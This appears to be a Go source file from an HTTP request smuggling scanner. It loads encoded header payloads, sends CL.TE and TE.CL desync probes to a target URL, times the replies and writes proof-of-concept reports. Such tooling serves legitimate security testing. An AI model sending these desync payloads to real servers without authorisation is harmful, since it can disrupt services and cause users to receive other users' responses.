package smuggler

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"log"
	"math"
	"math/rand"
	"net/url"
	"os"
	"strings"
	"time"
)

type Glob struct {
	Cookie    string
	Method    string
	URL       *url.URL
	Header    map[string]string
	Attempts  int
	ExitEarly bool
	Timeout   int
	File      string
}

var glob Glob

// the idea is to disrupt the way http request are dealt with (typically in FIFO), if a user
// sneaks in a request in another request, the synchronization will be affected resulting in
// weird behaviours (users receiving response meant to be received by other users)
type Desyncer interface {
	test(*Payload) (int, []byte, Payload, error)
	testCLTE()
	testTECL(int, *Payload) (int, []byte, Payload, error) // returns 1 if connection timedout, 0 if normal response,
	GetCookie() error                                     // 2 if disconnected before timeout
	Start() error
	execTest(string, Payload)
}

type DesyncerImpl struct {
	Desyncer
}

// builds a new payload
func NewPl(pl string) *Payload {
	payload := Payload{HdrPl: pl}
	payload.ReqLine = ReqLine{
		Method:  glob.Method,
		Path:    glob.URL.Path,
		Version: "HTTP/1.1",
		Query:   fmt.Sprintf("q=%d", rand.Int63n(math.MaxInt64))}

	headers := make(map[string]string)
	headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"
	headers["Connection"] = "Keep-alive"
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	headers["Host"] = glob.URL.Host

	payload.Header = headers
	for k, v := range glob.Header {
		payload.Header[k] = v
	}
	payload.Header["Cookie"] = glob.Cookie
	return &payload
}

func (DesyncerImpl) GetCookie(g *Glob) error {
	glob = *g
	t := Transport{}

	headers := make(map[string]string)
	headers["Host"] = glob.URL.Host
	headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"
	headers["Cache-Control"] = "no-store"
	headers["Pragma"] = "no-cache"
	headers["Accept"] = "*/*"
	// populate the global headers
	for k, v := range glob.Header {
		headers[k] = v
	}
	payload := Payload{Host: glob.URL.Host, Port: glob.URL.Port(), Header: headers,
		ReqLine: ReqLine{Method: "HEAD",
			Path: glob.URL.Path, Query: fmt.Sprint("nocache=", rand.Int63n(math.MaxInt64)), Version: "HTTP/1.1"}}

	resp, err := t.RoundTrip(&Request{Payload: &payload, Url: glob.URL})
	if err != nil {
		return err
	}
	resp.Body.Close()

	var hdr []string
	hdr = resp.Header.Values("Set-Cookie")
	if hdr == nil {
		hdr = resp.Header.Values("set-cookie")
	}
	var res []string = make([]string, len(hdr))
	for i, v := range hdr {
		if idx := strings.Index(v, ";"); idx != -1 {
			res[i] = v[:idx]
		}
	}
	glob.Cookie = strings.Join(res, "; ")
	return nil
}

func (d DesyncerImpl) Start() error {
	f, err := os.OpenFile("smuggler/tests/"+glob.File, os.O_RDONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		tmp, err := base64.StdEncoding.DecodeString(line)
		if err != nil {
			return err
		}
		payload := NewPl(string(tmp))
		d.execTest(payload)
	}
	return nil
}

func (d DesyncerImpl) test(p *Payload) (int, []byte, *Payload, error) {
	t := Transport{}
	start := time.Now()
	resp, err := t.RoundTrip(&Request{Url: glob.URL, Payload: p})
	if err != nil {
		if resp != nil {
			return int(resp.ContentLength), nil, p, err
		} else {
			return -1, nil, p, err
		}
	}
	diff := time.Since(start)

	var sample []byte = make([]byte, 100)
	if _, err = resp.Body.Read(sample); err != nil && err != io.EOF {
		return -1, nil, nil, fmt.Errorf("error while reading response received:%v", err)
	}
	resp.Body.Close()
	if len(sample) == 0 {
		if diff < time.Duration(time.Duration.Seconds(4.0)) {
			return 2, sample, p, nil // disconnected before timeout
		}
		return 1, sample, p, nil // connection timeout
	}
	headers := ""
	for k, v := range resp.Header {
		headers += fmt.Sprintf("%s: %s\n", k, v)
	}
	return 0, append([]byte(headers), sample...), p, nil // normal response
}

func (d DesyncerImpl) testTECL(ptype int, p *Payload) (int, []byte, *Payload, error) {
	if ptype == 0 {
		p.Cl = 6
	} else {
		p.Cl = 5
	}
	p.Body = "0\r\n\r\nG"
	return d.test(p)
}

func (d DesyncerImpl) testCLTE(ptype int, p *Payload) (int, []byte, *Payload, error) {
	if ptype == 0 {
		p.Cl = 4
	} else {
		p.Cl = 11
	}
	p.Body = fmt.Sprintf("%X\r\nG\r\n0\r\n\r\n", 1) // if all the payload is sent, it should be a valid request
	return d.test(p)                                //because encoding is terminated with a chunk of 0 value
}

func (d DesyncerImpl) execTest(v *Payload) {
	startTime := time.Now()
	log.Print("Testing TECL...")
	teclRet, teclRes, teclPayload, err := d.testTECL(0, v)
	if teclRet == -1 {
		log.Print(err)
		return
	}

	teclTime := time.Since(startTime)

	log.Print("Testing CLTE...")
	startTime = time.Now()
	clteRet, clteRes, cltePayload, err := d.testCLTE(0, v)
	if clteRet == -1 {
		log.Print(err)
		return
	}
	clteTime := time.Since(startTime)

	if clteRet == 1 {
		clteRet2, _, _, err := d.testCLTE(1, v)
		if clteRet2 == -1 {
			log.Print(err)
			return
		}
		if clteRet2 == 0 {
			glob.Attempts += 1
			if glob.Attempts < 3 {
				d.execTest(v)
				return
			} else {
				log.Printf("Potential CLTE issue found - %s@%s://%s%s", (*v).ReqLine.Method, glob.URL.Scheme, glob.URL.Host,
					glob.URL.Path)
				GenReport(cltePayload, clteTime, clteRes)
				if glob.ExitEarly {
					os.Exit(0)
				}
				glob.Attempts = 0
				return
			}
		} else {
			log.Print("CLTE timeout on both length 4 and 11")
		}
	} else if teclRet == 1 {
		teclRet2, _, _, err := d.testTECL(1, v)
		if teclRet2 == -1 {
			log.Print(err)
			return
		}
		if teclRet2 == 0 {
			glob.Attempts += 1
			if glob.Attempts < 3 {
				d.execTest(v)
				return
			} else {
				log.Printf("Potential TECL issue found - %s@%s://%s%s", (*v).ReqLine.Method, glob.URL.Scheme, glob.URL.Host,
					glob.URL.Path)
				GenReport(teclPayload, teclTime, teclRes)
				if glob.ExitEarly {
					os.Exit(0)
				}
				glob.Attempts = 0
				return
			}
		} else {
			log.Print("TECL timeout on both length 5 and 6")
		}
	} else if teclRet == -1 || clteRet == -1 {
		log.Print("Socket error")
	} else if teclRet == 0 && clteRet == 0 {
		log.Print("No issues found")
	} else if teclRet == 2 || clteRet == 2 {
		log.Print("DISCONNECTED")
	}
	glob.Attempts = 0
}

func GenReport(p *Payload, t time.Duration, content []byte) {
	if err := createDir("/payloads/"); err != nil {
		log.Print(err)
	}
	pwd, err := os.Getwd()
	if err != nil {
		log.Print(err)
		return
	}
	fname := fmt.Sprintf("%s/payloads/%s_%s", pwd, strings.ReplaceAll(glob.URL.Host, ".", "_"), p.ReqLine.Query)
	file, err := os.OpenFile(fname, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Print(err)
		return
	}

	file.WriteString("Server reply\n-----------------------------\n" + string(content))
	for k, v := range p.Header {
		kl := strings.ToLower(strings.TrimSpace(k))
		if kl == "content-length" || kl == "transfer-encoding" {
			toFind := ""
			for i := 0; i <= 0xF; i++ {
				toFind += string(byte(i))
			}
			if !strings.ContainsAny(k, toFind) {
				break
			}
			fin := ""
			for i := 0; i < len(k); i++ {
				if k[i] <= 0xF {
					fin += fmt.Sprintf("\\x0%x", k[i])
				} else {
					fin += string(k[i])
				}
			}
			nk := fin
			fin = ""
			for i := 0; i < len(v); i++ {
				if v[i] < 0xF {
					fin += fmt.Sprintf("\\x0%x", v[i])
				} else {
					fin += string(v[i])
				}
			}
			v = fin
			p.Header[nk] = v
			delete(p.Header, k)
		}
	}
	file.WriteString("\nPoC Payload\n------------------------------\n" + (*p).ToString())
	file.Close()
}

func createDir(dir string) error {
	pwd, err := os.Getwd()
	if err != nil {
		return err
	}
	info, err := os.Stat(pwd + dir)
	flag := true
	if err != nil {
		if !errors.Is(err, os.ErrNotExist) {
			return err
		}
		flag = false
	}
	if flag {
		if !info.IsDir() {
			if err := os.Mkdir(pwd+dir, 0777); err != nil {
				return err
			}
		}
	} else {
		if err := os.Mkdir(pwd+dir, 0777); err != nil {
			return err
		}
	}
	return nil
}
